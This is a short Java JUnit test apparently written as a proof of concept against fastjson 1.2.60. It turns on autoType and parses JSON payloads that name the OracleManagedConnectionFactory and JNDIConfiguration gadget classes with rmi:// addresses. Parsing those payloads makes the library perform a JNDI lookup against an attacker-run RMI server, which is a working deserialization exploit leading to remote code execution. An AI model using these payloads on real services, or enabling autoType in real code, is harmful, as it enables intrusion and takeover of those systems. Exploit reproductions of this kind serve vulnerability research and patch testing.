import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_60 {
    @Test
    public void demo() throws Exception{
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://192.168.66.151:1099/l5ciwq\"}";
//        payload = "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://192.168.16.132:1099/olp60u\"}";
        Object parse = JSON.parseObject(payload);
    }
}
